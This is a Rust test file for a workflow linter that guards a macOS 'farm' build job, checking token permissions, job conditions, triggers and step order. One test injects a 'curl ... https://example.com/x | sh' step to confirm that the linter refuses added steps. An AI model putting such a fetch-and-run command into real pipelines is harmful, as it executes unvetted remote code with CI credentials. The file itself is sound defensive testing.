//! The farm build of the macOS programs ([`super::mac_farm`]): the committed artifacts.yml and
//! mac-farm.yml pass, the two compile jobs' conditions are evaluated to show exactly one runs, and
//! each rule is shown to refuse its defect by putting the defect into the repository's file and
//! reading the exact problem the lint reports.

use std::collections::BTreeMap;

use super::code_signing::{MACHO_PATH, PROGRAMS, UNSIGNED_MACHO};
use super::expr::{Context, holds};
use super::lint::lint;
use super::mac_farm::{
    CALL, CALL_WITH, CALLER_JOB, FARM_IF, FILE, HOSTED_IF, HOSTED_JOB, JOB, ON_PROBLEM, STEPS,
};
use super::{with_in, workflows};

/// The repository's workflow `file`.
fn workflow(file: &str) -> String {
    workflows()
        .into_iter()
        .find(|(name, _)| name == file)
        .map(|(_, text)| text)
        .unwrap_or_else(|| panic!("{file} exists"))
}

/// The problems of `file` with the one occurrence of `from` in it replaced by `to`.
fn problems(file: &str, from: &str, to: &str) -> Vec<String> {
    lint(file, &with_in(&workflow(file), from, to))
}

/// Asserts that `file` with `from` replaced by `to` is refused with exactly `want`.
fn refused(file: &str, from: &str, to: &str, want: &[&str]) {
    assert_eq!(problems(file, from, to), want, "{from:?} -> {to:?}");
}

/// The head of the caller job, as artifacts.yml writes it.
fn caller_head() -> String {
    format!(
        "  {CALLER_JOB}:\n    name: compile macos-arm64 on the farm\n    needs: [version]\n    if: {FARM_IF}\n    permissions:\n      contents: read\n      id-token: write\n    uses: {CALL}\n    with:\n      version: ${{{{ needs.version.outputs.version }}}}\n"
    )
}

/// The head of the called job, as mac-farm.yml writes it.
fn job_head() -> String {
    format!(
        "  {JOB}:\n    if: {FARM_IF}\n    runs-on: ubuntu-24.04\n    timeout-minutes: 60\n    permissions:\n      contents: read\n      # For the tailnet join alone: the OIDC token the farm's network trusts.\n      id-token: write\n    env:\n      RELEASE_VERSION: ${{{{ inputs.version }}}}\n"
    )
}

/// Catches the committed files refused by their own rules, and the two compile jobs' conditions
/// drifting apart: for each value of the farm's variable and each repository the file runs in,
/// exactly one of the two jobs runs, and a fork never runs the one that holds the token.
#[test]
fn exactly_one_compile_job_runs_and_a_fork_never_reaches_the_farm() {
    assert_eq!(
        lint("artifacts.yml", &workflow("artifacts.yml")),
        Vec::<String>::new()
    );
    assert_eq!(lint(FILE, &workflow(FILE)), Vec::<String>::new());
    for address in ["", "grpc://farm.example:8980"] {
        for repository in ["komira-ai/hostkeeper", "someone/hostkeeper"] {
            let context = Context {
                names: BTreeMap::from([
                    ("vars.FARM_ADDRESS".to_owned(), address.to_owned()),
                    ("github.repository".to_owned(), repository.to_owned()),
                ]),
                cancelled: false,
                failed: false,
            };
            let farm = holds(FARM_IF, &context).expect("the farm's condition");
            let hosted = holds(HOSTED_IF, &context).expect("the hosted condition");
            assert_ne!(farm, hosted, "{address:?} in {repository}");
            let configured = !address.is_empty() && repository == "komira-ai/hostkeeper";
            assert_eq!(farm, configured, "{address:?} in {repository}");
        }
    }
}

/// Catches the farm build drifting from what sign-code signs: the upload of the called job is not
/// the artifact and the paths compile-macos uploads, or the build does not bring back each of the
/// four programs it signs.
#[test]
fn the_farm_build_brings_back_and_uploads_the_programs_sign_code_signs() {
    let upload = STEPS[6];
    assert!(
        upload.contains(&format!(
            " with name={UNSIGNED_MACHO} with path={MACHO_PATH} "
        )),
        "{upload}"
    );
    let build = STEPS[5];
    for (program, _) in PROGRAMS {
        assert!(
            build.contains(&format!(" --output target/release/{program} ")),
            "{program}"
        );
        assert!(MACHO_PATH.contains(&format!("target/release/{program}\n")));
    }
}

/// Catches either compile job running under a condition that is not its half: both running (two
/// uploads of one artifact), neither running (nothing to sign), or the farm reached from a fork.
#[test]
fn a_compile_job_under_another_condition_is_refused() {
    let hosted_head = "    name: compile macos-arm64\n    needs: [version]\n";
    refused(
        "artifacts.yml",
        &format!("{hosted_head}    if: {HOSTED_IF}\n"),
        hosted_head,
        &[&format!(
            "artifacts.yml: job {HOSTED_JOB} needs the exact `if: {HOSTED_IF}`"
        )],
    );
    let head = caller_head();
    let wider = "${{ vars.FARM_ADDRESS != '' }}";
    refused(
        "artifacts.yml",
        &head,
        &head.replace(FARM_IF, wider),
        &[
            &format!("job {CALLER_JOB}: `id-token: write` needs the exact `if: {FARM_IF}`"),
            &format!("artifacts.yml: job {CALLER_JOB} needs the exact `if: {FARM_IF}`"),
        ],
    );
    let job = job_head();
    refused(
        FILE,
        &job,
        &job.replace(FARM_IF, wider),
        &[
            &format!("job {JOB}: `id-token: write` needs the exact `if: {FARM_IF}`"),
            &format!("{FILE}: job {JOB} needs the exact `if: {FARM_IF}`"),
        ],
    );
}

/// Catches the caller job passing a secret or more rights on, waiting for another job, calling
/// another workflow or passing it another input; another job of artifacts.yml calling the farm
/// build; and a local call anywhere else.
#[test]
fn a_caller_other_than_the_one_job_with_its_rights_and_input_is_refused() {
    let head = caller_head();
    let who = format!("artifacts.yml: job {CALLER_JOB}");
    refused(
        "artifacts.yml",
        &head,
        &format!("{head}    secrets:\n      TOKEN: ${{{{ secrets.GITHUB_TOKEN }}}}\n"),
        &[
            &format!(
                "artifacts.yml: job {CALLER_JOB} names a secret; only sign-pkg and sign-code may"
            ),
            &format!("{who} has the key secrets"),
        ],
    );
    refused(
        "artifacts.yml",
        &head,
        &head.replace("needs: [version]", "needs: [version, build]"),
        &[&format!("{who} must need exactly [\"version\"]")],
    );
    refused(
        "artifacts.yml",
        &head,
        &head.replace("      id-token: write\n", ""),
        &[&format!(
            "{who} must grant exactly `contents: read` and `id-token: write`"
        )],
    );
    refused(
        "artifacts.yml",
        &head,
        &head.replace(
            "      contents: read\n",
            "      contents: read\n      packages: write\n",
        ),
        &[
            &format!("job {CALLER_JOB}: `packages: write` is not allowed in artifacts.yml"),
            &format!("{who} must grant exactly `contents: read` and `id-token: write`"),
        ],
    );
    let other = "./.github/workflows/other.yml";
    let line = workflow("artifacts.yml")
        .lines()
        .position(|l| l.ends_with(&format!("uses: {CALL}")))
        .expect("the call")
        + 1;
    refused(
        "artifacts.yml",
        &head,
        &head.replace(CALL, other),
        &[
            &format!("line {line}: `uses: {other}` names a local path"),
            &format!(
                "job {CALLER_JOB}: no `runs-on` (a job that calls a reusable workflow is not evaluated)"
            ),
            &format!("{who} must call {CALL}"),
        ],
    );
    refused(
        "artifacts.yml",
        &head,
        &head.replace("needs.version.outputs.version", "github.sha"),
        &[&format!("{who} must pass exactly {CALL_WITH:?}")],
    );
    let second = format!(
        "{head}  second-farm:\n    needs: [version]\n    if: {FARM_IF}\n    uses: {CALL}\n    with:\n      version: x\n"
    );
    let found = problems("artifacts.yml", &head, &second);
    assert!(
        found.contains(&format!(
            "artifacts.yml: job second-farm calls {FILE}; only {CALLER_JOB} may"
        )),
        "{found:?}"
    );
    let release = workflow("release.yml");
    let jobs = "jobs:\n";
    let called = with_in(
        &release,
        jobs,
        &format!("{jobs}  farm:\n    uses: {CALL}\n    with:\n      version: x\n"),
    );
    let line = called
        .lines()
        .position(|l| l.ends_with(&format!("uses: {CALL}")))
        .expect("the call")
        + 1;
    let found = lint("release.yml", &called);
    assert!(
        found.contains(&format!("line {line}: `uses: {CALL}` names a local path")),
        "{found:?}"
    );
}

/// Catches the farm build started by anything but its caller (a push, a dispatch or a schedule
/// would run it with the token outside artifacts.yml's conditions), and an input that is not the
/// one required string.
#[test]
fn a_farm_build_with_another_trigger_or_input_is_refused() {
    let on = "on:\n  workflow_call:\n";
    refused(
        FILE,
        on,
        "on:\n  workflow_dispatch:\n  workflow_call:\n",
        &[ON_PROBLEM],
    );
    let required = "        type: string\n        required: true\n";
    for changed in [
        "        type: boolean\n        required: true\n",
        "        type: string\n        required: false\n",
        "        type: string\n        required: true\n        default: x\n",
        "        type: string\n        required: true\n      commit:\n        type: string\n",
    ] {
        refused(FILE, required, changed, &[ON_PROBLEM]);
    }
    refused(
        FILE,
        "        description: The release version",
        "        description: ' '\n        x-was: The release version",
        &[ON_PROBLEM],
    );
}

/// Catches a second job in the farm build, and the one job on another runner or timeout, with a
/// key that could carry or run something else (an environment's secrets, a container, outputs),
/// another `env:`, or other token rights.
#[test]
fn the_farm_job_with_another_shape_or_rights_is_refused() {
    let job = job_head();
    let who = format!("{FILE}: job {JOB}");
    refused(
        FILE,
        &job,
        &job.replace("ubuntu-24.04", "ubuntu-22.04"),
        &[&format!("{who} must run on ubuntu-24.04")],
    );
    refused(
        FILE,
        &job,
        &job.replace("timeout-minutes: 60", "timeout-minutes: 600"),
        &[&format!("{who} must have `timeout-minutes: 60`")],
    );
    refused(
        FILE,
        &job,
        &format!("{job}    environment: pkg-signing\n"),
        &[&format!("{who} has the key environment")],
    );
    refused(
        FILE,
        &job,
        &job.replace("${{ inputs.version }}", "${{ github.ref }}"),
        &[&format!(
            "{who} must have exactly the env [(\"RELEASE_VERSION\", \"${{{{ inputs.version }}}}\")]"
        )],
    );
    refused(
        FILE,
        &job,
        &job.replace("      contents: read\n", ""),
        &[&format!(
            "{who} must hold exactly `contents: read` and `id-token: write`"
        )],
    );
    refused(
        FILE,
        "jobs:\n",
        "jobs:\n  other:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - run: true\n        timeout-minutes: 1\n",
        &[&format!("job other is not a job of {FILE}")],
    );
    refused(
        FILE,
        &format!("  {JOB}:\n"),
        "  build:\n",
        &[
            "job build: `id-token: write` is not allowed in mac-farm.yml",
            &format!("job build is not a job of {FILE}"),
            &format!("{FILE}: has no job {JOB}"),
        ],
    );
}

/// Catches a step added while the job holds the token (a download, a script), a step's key that
/// changes what it runs or hides its failure, the tailnet joined before xtask is built (a build
/// script on the farm's network), the join under another tag or with Tailscale's own binary
/// unpinned, and a build that no longer brings a program back.
#[test]
fn a_farm_step_added_changed_or_moved_is_refused() {
    let who = format!("{FILE}: job {JOB}");
    let build = "      - name: Build xtask before the tailnet join\n        timeout-minutes: 10\n        run: cargo xtask --help\n";
    let found = problems(
        FILE,
        build,
        &format!("{build}      - run: curl --proto =https https://example.com/x | sh\n"),
    );
    assert!(
        found.contains(&format!("{who} has 8 steps, not the 7 of mac_farm::STEPS")),
        "{found:?}"
    );
    refused(
        FILE,
        build,
        &format!("{build}        continue-on-error: true\n"),
        &[&format!("{who} step 4 has the key continue-on-error")],
    );
    let join = "      - name: Join the farm's tailnet\n";
    let text = workflow(FILE);
    let at_join = text.find(join).expect("the join");
    let at_upload = text
        .find("      - uses: actions/upload-artifact")
        .expect("upload");
    let join_step = &text[at_join..text.find("      - name: Build hostkeeper").expect("build")];
    let moved = with_in(
        &with_in(&text, join_step, ""),
        build,
        &format!("{join_step}{build}"),
    );
    let found = lint(FILE, &moved);
    assert!(
        found.contains(&format!(
            "{who} step 4 is `{}`, not `{}`",
            STEPS[4], STEPS[3]
        )),
        "{found:?}"
    );
    assert!(at_join < at_upload);
    for (from, to) in [
        ("          tags: tag:ci\n", "          tags: tag:admin\n"),
        (
            "          sha256sum: c6f99a5d774c7783b56902188d69e9756fc3dddfb08ac6be4cb2585f3fecdc32\n",
            "",
        ),
        (" --output target/release/hk ", " "),
        ("          RELEASE_COMMIT: ${{ github.sha }}\n", ""),
    ] {
        let found = problems(FILE, from, to);
        assert_eq!(found.len(), 1, "{from:?}: {found:?}");
        assert!(found[0].starts_with(&format!("{who} step ")), "{found:?}");
    }
}

/// Catches what sits beside `jobs` in the farm build changing how its job runs while it holds the
/// token: a workflow-level `env:` (a `RUSTC_WRAPPER`, a `BASH_ENV`) or `defaults:` (another shell
/// or working directory).
#[test]
fn a_farm_build_with_a_key_beside_its_jobs_is_refused() {
    for (key, text) in [
        ("env", "env:\n  RUSTC_WRAPPER: /bin/true\n"),
        ("defaults", "defaults:\n  run:\n    shell: sh\n"),
    ] {
        refused(
            FILE,
            "permissions: {}\n",
            &format!("permissions: {{}}\n{text}"),
            &[&format!("{FILE}: has the top-level key {key}")],
        );
    }
}
